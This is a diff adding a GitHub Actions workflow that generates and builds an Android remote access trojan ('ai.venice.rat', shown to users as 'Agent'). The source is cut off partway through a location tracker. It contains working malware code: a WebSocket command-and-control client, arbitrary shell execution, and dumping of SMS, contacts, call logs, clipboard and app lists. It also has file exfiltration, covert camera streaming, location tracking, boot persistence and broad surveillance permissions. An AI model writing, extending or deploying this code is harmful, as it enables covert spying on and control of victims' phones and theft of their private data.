@@ -1,0 +1,396 @@
+name: build
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+permissions:
+  contents: write
+
+jobs:
+  apk:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-java@v4
+        with: { distribution: temurin, java-version: '17' }
+      - uses: android-actions/setup-android@v3
+      - uses: gradle/actions/setup-gradle@v4
+
+      - name: write project
+        run: |
+          set -e
+          mkdir -p app/src/main/java/ai/venice/rat/{caps,util} app/src/main/res/{values,drawable}
+
+          cat > settings.gradle.kts <<'EOF'
+          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
+          dependencyResolutionManagement {
+            repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+            repositories { google(); mavenCentral() }
+          }
+          rootProject.name = "rat"; include(":app")
+          EOF
+
+          cat > build.gradle.kts <<'EOF'
+          plugins {
+            id("com.android.application") version "8.9.0" apply false
+            id("org.jetbrains.kotlin.android") version "2.1.0" apply false
+            id("org.jetbrains.kotlin.plugin.compose") version "2.1.0" apply false
+          }
+          EOF
+
+          cat > gradle.properties <<'EOF'
+          org.gradle.jvmargs=-Xmx3g -Dfile.encoding=UTF-8
+          android.useAndroidX=true
+          android.nonTransitiveRClass=true
+          EOF
+
+          cat > app/build.gradle.kts <<'EOF'
+          plugins {
+            id("com.android.application")
+            id("org.jetbrains.kotlin.android")
+            id("org.jetbrains.kotlin.plugin.compose")
+          }
+          android {
+            namespace = "ai.venice.rat"; compileSdk = 35
+            defaultConfig { applicationId = "ai.venice.rat"; minSdk = 24; targetSdk = 35; versionCode = 1; versionName = "1.0" }
+            buildFeatures { compose = true }
+            compileOptions { sourceCompatibility = JavaVersion.VERSION_17; targetCompatibility = JavaVersion.VERSION_17 }
+            kotlinOptions { jvmTarget = "17" }
+          }
+          dependencies {
+            implementation("androidx.core:core-ktx:1.15.0")
+            implementation("androidx.activity:activity-compose:1.9.3")
+            implementation(platform("androidx.compose:compose-bom:2024.12.01"))
+            implementation("androidx.compose.material3:material3")
+            implementation("androidx.lifecycle:lifecycle-runtime-compose:2.8.7")
+            implementation("com.squareup.okhttp3:okhttp:4.12.0")
+            implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.9.0")
+            implementation("org.jetbrains.kotlinx:kotlinx-coroutines-play-services:1.9.0")
+            implementation("com.google.android.gms:play-services-location:21.3.0")
+            implementation("androidx.camera:camera-core:1.4.1")
+            implementation("androidx.camera:camera-camera2:1.4.1")
+            implementation("androidx.camera:camera-lifecycle:1.4.1")
+          }
+          EOF
+
+          cat > app/src/main/AndroidManifest.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
+            <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
+            <uses-feature android:name="android.hardware.camera" android:required="false"/>
+            <application android:label="@string/app_name" android:icon="@drawable/ic_launcher"
+                android:theme="@style/Theme.Rat" android:usesCleartextTraffic="true">
+              <activity android:name=".MainActivity" android:exported="true">
+                <intent-filter>
+                  <action android:name="android.intent.action.MAIN"/>
+                  <category android:name="android.intent.category.LAUNCHER"/>
+                </intent-filter>
+              </activity>
+              <service android:name=".AgentService" android:exported="false"
+                  android:foregroundServiceType="specialUse|camera|location">
+                <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="remote_agent"/>
+              </service>
+              <receiver android:name=".BootReceiver" android:exported="true">
+                <intent-filter>
+                  <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                  <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                </intent-filter>
+              </receiver>
+            </application>
+          </manifest>
+          EOF
+
+          cat > app/src/main/res/values/strings.xml <<'EOF'
+          <resources><string name="app_name">Agent</string></resources>
+          EOF
+
+          cat > app/src/main/res/values/themes.xml <<'EOF'
+          <resources>
+            <style name="Theme.Rat" parent="android:Theme.Material.NoActionBar">
+              <item name="android:statusBarColor">#0B0F14</item>
+              <item name="android:navigationBarColor">#0B0F14</item>
+              <item name="android:windowBackground">#0B0F14</item>
+            </style>
+          </resources>
+          EOF
+
+          cat > app/src/main/res/drawable/ic_launcher.xml <<'EOF'
+          <vector xmlns:android="http://schemas.android.com/apk/res/android"
+            android:width="108dp" android:height="108dp" android:viewportWidth="108" android:viewportHeight="108">
+            <path android:fillColor="#0B0F14" android:pathData="M0,0h108v108h-108z"/>
+            <path android:strokeColor="#2DD4BF" android:strokeWidth="3" android:strokeAlpha="0.3"
+              android:fillColor="#00000000" android:pathData="M54,54 L54,10 A44,44 0 0,1 98,54"/>
+            <path android:strokeColor="#2DD4BF" android:strokeWidth="3" android:strokeAlpha="0.55"
+              android:fillColor="#00000000" android:pathData="M54,54 L18,90"/>
+            <path android:fillColor="#2DD4BF" android:pathData="M54,38 a10,10 0 0,1 10,10 c0,8 -10,19 -10,19 c0,0 -10,-11 -10,-19 a10,10 0 0,1 10,-10z"/>
+            <path android:fillColor="#0B0F14" android:pathData="M54,44 a4,4 0 1,1 0,8 a4,4 0 1,1 0,-8z"/>
+          </vector>
+          EOF
+
+          cat > app/src/main/java/ai/venice/rat/DeviceInfo.kt <<'EOF'
+          package ai.venice.rat
+          import android.content.Context
+          import android.os.Build
+          import org.json.JSONObject
+          class DeviceInfo(private val c: Context) {
+            fun json() = JSONObject().apply {
+              put("model", Build.MODEL); put("brand", Build.BRAND)
+              put("android", Build.VERSION.RELEASE); put("sdk", Build.VERSION.SDK_INT)
+              put("abi", Build.SUPPORTED_ABIS.joinToString())
+              put("battery", c.getSystemService(Context.BATTERY_SERVICE)
+                .getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY))
+            }
+          }
+          EOF
+
+          cat > app/src/main/java/ai/venice/rat/C2Client.kt <<'EOF'
+          package ai.venice.rat
+          import kotlinx.coroutines.*
+          import okhttp3.*
+          import okio.ByteString
+          import org.json.JSONObject
+          import java.util.concurrent.TimeUnit
+          class C2Client(private val url: String, private val hello: () -> JSONObject,
+                         private val onMsg: (JSONObject) -> Unit, private val onState: (Boolean, String) -> Unit) {
+            private val http = OkHttpClient.Builder().pingInterval(20, TimeUnit.SECONDS).build()
+            private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+            private var ws: WebSocket? = null
+            private var attempt = 0
+            fun connect() {
+              ws = http.newWebSocket(Request.Builder().url(url).build(), object : WebSocketListener() {
+                override fun onOpen(w: WebSocket, r: Response) { attempt = 0; onState(true, "open"); w.send(hello().toString()) }
+                override fun onMessage(w: WebSocket, t: String) { runCatching { onMsg(JSONObject(t)) } }
+                override fun onFailure(w: WebSocket, t: Throwable, r: Response?) { onState(false, t.message ?: "fail"); retry() }
+                override fun onClosed(w: WebSocket, c: Int, r: String) { onState(false, "closed $c"); retry() }
+              })
+            }
+            private fun retry() {
+              if (!scope.isActive) return
+              val ms = minOf(60_000L, 1_000L shl minOf(++attempt, 6))
+              scope.launch { delay(ms); connect() }
+            }
+            fun send(s: String) { ws?.send(s) }
+            fun sendBin(b: ByteArray) { ws?.send(ByteString.of(*b)) }
+            fun close() { runCatching { ws?.close(1000, "bye") }; scope.cancel() }
+          }
+          EOF
+
+          cat > app/src/main/java/ai/venice/rat/caps/Shell.kt <<'EOF'
+          package ai.venice.rat.caps
+          object Shell {
+            fun exec(c: String): String {
+              val p = ProcessBuilder("sh", "-c", c).redirectErrorStream(true).start()
+              val o = p.inputStream.bufferedReader().readText(); p.waitFor(); return o
+            }
+          }
+          EOF
+
+          cat > app/src/main/java/ai/venice/rat/caps/Files.kt <<'EOF'
+          package ai.venice.rat.caps
+          import android.util.Base64
+          import java.io.File
+          object Files {
+            fun ls(p: String) = File(p).listFiles()?.sortedBy { it.name }
+              ?.joinToString("\n") { "${if (it.isDirectory) "d" else "-"} ${it.length()}\t${it.name}" } ?: "empty"
+            fun readText(p: String) = File(p).readText()
+            fun readB64(p: String) = Base64.encodeToString(File(p).readBytes(), Base64.NO_WRAP)
+            fun writeB64(p: String, d: String) { val f = File(p); f.parentFile?.mkdirs()
+              f.writeBytes(Base64.decode(d, Base64.NO_WRAP)) }
+          }
+          EOF
+
+          cat > app/src/main/java/ai/venice/rat/caps/Sms.kt <<'EOF'
+          package ai.venice.rat.caps
+          import android.content.Context
+          import android.provider.Telephony
+          object Sms {
+            fun dump(c: Context, n: Int = 50): String {
+              val sb = StringBuilder()
+              c.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT $n")?.use { x ->
+                while (x.moveToNext()) sb.append(x.getString(x.getColumnIndexOrThrow("address"))).append(": ")
+                  .append(x.getString(x.getColumnIndexOrThrow("body"))).append('\n')
+              }
+              return sb.toString()
+            }
+          }
+          EOF
+
+          cat > app/src/main/java/ai/venice/rat/caps/Contacts.kt <<'EOF'
+          package ai.venice.rat.caps
+          import android.content.Context
+          import android.provider.ContactsContract
+          object Contacts {
+            fun dump(c: Context): String {
+              val sb = StringBuilder()
+              c.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, "display_name")?.use { x ->
+                while (x.moveToNext()) sb.append(x.getString(x.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
+                  .append(": ").append(x.getString(x.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append('\n')
+              }
+              return sb.toString()
+            }
+          }
+          EOF
+
+          cat > app/src/main/java/ai/venice/rat/caps/Calls.kt <<'EOF'
+          package ai.venice.rat.caps
+          import android.content.Context
+          import android.provider.CallLog
+          object Calls {
+            fun dump(c: Context, n: Int = 50): String {
+              val sb = StringBuilder()
+              c.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT $n")?.use { x ->
+                while (x.moveToNext()) sb.append(x.getString(x.getColumnIndexOrThrow(CallLog.Calls.NUMBER)))
+                  .append(" ").append(x.getString(x.getColumnIndexOrThrow(CallLog.Calls.DURATION))).append("s\n")
+              }
+              return sb.toString()
+            }
+          }
+          EOF
+
+          cat > app/src/main/java/ai/venice/rat/caps/Apps.kt <<'EOF'
+          package ai.venice.rat.caps
+          import android.content.Context
+          object Apps {
+            fun list(c: Context) = c.packageManager.getInstalledPackages(0).joinToString("\n") { it.packageName }
+          }
+          EOF
+
+          cat > app/src/main/java/ai/venice/rat/caps/Clip.kt <<'EOF'
+          package ai.venice.rat.caps
+          import android.content.ClipboardManager
+          import android.content.Context
+          object Clip {
+            fun get(c: Context) = (c.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
+              .primaryClip?.getItemAt(0)?.text?.toString() ?: ""
+          }
+          EOF
+
+          cat > app/src/main/java/ai/venice/rat/util/Ui.kt <<'EOF'
+          package ai.venice.rat.util
+          import android.content.Context
+          import android.os.Handler
+          import android.os.Looper
+          import android.widget.Toast
+          object Ui {
+            fun toast(c: Context, m: String) = Handler(Looper.getMainLooper()).post { Toast.makeText(c, m, Toast.LENGTH_SHORT).show() }
+          }
+          EOF
+
+          cat > app/src/main/java/ai/venice/rat/caps/CameraStreamer.kt <<'EOF'
+          package ai.venice.rat.caps
+          import android.content.Context
+          import android.graphics.Bitmap
+          import android.graphics.Matrix
+          import android.os.Handler
+          import android.os.Looper
+          import android.os.SystemClock
+          import android.util.Log
+          import android.util.Size
+          import androidx.camera.core.*
+          import androidx.camera.lifecycle.ProcessCameraProvider
+          import androidx.core.content.ContextCompat
+          import androidx.lifecycle.Lifecycle
+          import androidx.lifecycle.LifecycleOwner
+          import androidx.lifecycle.LifecycleRegistry
+          import java.io.ByteArrayOutputStream
+          import java.util.concurrent.Executors
+          class CameraStreamer(private val ctx: Context) : LifecycleOwner {
+            private val reg = LifecycleRegistry(this)
+            private val main = Handler(Looper.getMainLooper())
+            private val ex = Executors.newSingleThreadExecutor()
+            private var provider: ProcessCameraProvider? = null
+            override val lifecycle: Lifecycle get() = reg
+            @Volatile var facing = CameraSelector.LENS_FACING_BACK
+            @Volatile var fps = 8
+            @Volatile var quality = 55
+            @Volatile var active = false; private set
+            @Volatile private var shot = false
+            private var last = 0L
+            var onFrame: ((ByteArray) -> Unit)? = null
+            fun start() = main.post {
+              if (active) return@post
+              active = true
+              reg.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
+              reg.handleLifecycleEvent(Lifecycle.Event.ON_START)
+              reg.handleLifecycleEvent(Lifecycle.Event.ON_RESUME); bind()
+            }
+            fun stop() = main.post {
+              if (!active) return@post
+              active = false; provider?.unbindAll()
+              reg.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
+              reg.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
+              reg.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
+            }
+            fun switch() = main.post {
+              facing = if (facing == CameraSelector.LENS_FACING_BACK) CameraSelector.LENS_FACING_FRONT else CameraSelector.LENS_FACING_BACK
+              if (active) bind()
+            }
+            fun shot() { shot = true }
+            private fun bind() {
+              val f = ProcessCameraProvider.getInstance(ctx)
+              f.addListener({ runCatching {
+                val p = f.get(); provider = p; p.unbindAll()
+                val a = ImageAnalysis.Builder()
+                  .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
+                  .setResolutionSelector(ResolutionSelector.Builder().setResolutionStrategy(
+                    ResolutionStrategy(Size(640, 480), ResolutionStrategy.FALLBACK_RULE_CLOSEST_LOWER_THEN_HIGHER)).build())
+                  .build()
+                a.setAnalyzer(ex) { emit(it) }
+                p.bindToLifecycle(this, CameraSelector.Builder().requireLensFacing(facing).build(), a)
+              }.onFailure { Log.w("CAM", "bind", it) } }, ContextCompat.getMainExecutor(ctx))
+            }
+            private fun emit(px: ImageProxy) {
+              try {
+                val s = shot; val now = SystemClock.elapsedRealtime()
+                if (!s && now - last < 1000L / fps) return
+                last = now; if (s) shot = false
+                var b: Bitmap = px.toBitmap()
+                val d = px.imageInfo.rotationDegrees
+                if (d != 0) b = Bitmap.createBitmap(b, 0, 0, b.width, b.height, Matrix().apply { postRotate(d.toFloat()) }, true)
+                val o = ByteArrayOutputStream(); b.compress(Bitmap.CompressFormat.JPEG, if (s) 92 else quality, o); b.recycle()
+                onFrame?.invoke(o.toByteArray())
+              } catch (t: Throwable) { Log.w("CAM", "frame", t) } finally { px.close() }
+            }
+          }
+          EOF
+
+          cat > app/src/main/java/ai/venice/rat/caps/LocTracker.kt <<'EOF'
+          package ai.venice.rat.caps
+          import android.annotation.SuppressLint
+          import android.content.Context
+          import android.location.Geocoder
+          import android.location.Location
+          import android.os.Looper
+          import com.google.android.gms.location.*
+          import kotlinx.coroutines.*
+          import org.json.JSONObject
+          import java.io.File
+          import java.util.Locale
+          class LocTracker(private val ctx: Context) {
+            private val client by lazy { LocationServices.getFusedLocationProviderClient(ctx) }
+            private val file by lazy { File(ctx.filesDir, "trail.jsonl") }
+            private val io = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+            private val ring = ArrayDeque<JSONObject>(2000)
+            @Volatile var streaming = false; private set
+            var onFix: ((JSONObject) -> Unit)? = null
+            private val cb = object : LocationCallback() {
+              override fun onLocationResult(r: LocationResult) { r.lastLocation?.let { rec(it) } }
+            }
